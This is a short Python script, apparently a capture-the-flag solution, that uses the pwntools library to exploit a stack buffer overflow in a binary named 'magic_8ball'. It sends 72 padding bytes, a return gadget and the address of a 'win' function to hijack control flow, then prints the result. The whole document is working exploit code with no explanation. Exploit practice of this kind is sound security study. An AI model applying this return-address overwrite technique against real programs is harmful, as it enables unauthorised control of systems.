from pwn import *

binary = context.binary = ELF("./magic_8ball")

if args.REMOTE:
    p = remote()
else:
    p = process(binary.path)

rop = ROP(binary)
ret = rop.ret.address

payload = b""
payload += b"A"*72
payload += p64(ret)
payload += p64(binary.symbols["win"])

p.sendlineafter(b"question? ", payload)

p.recvline()
print(p.recvline().decode('utf-8'))
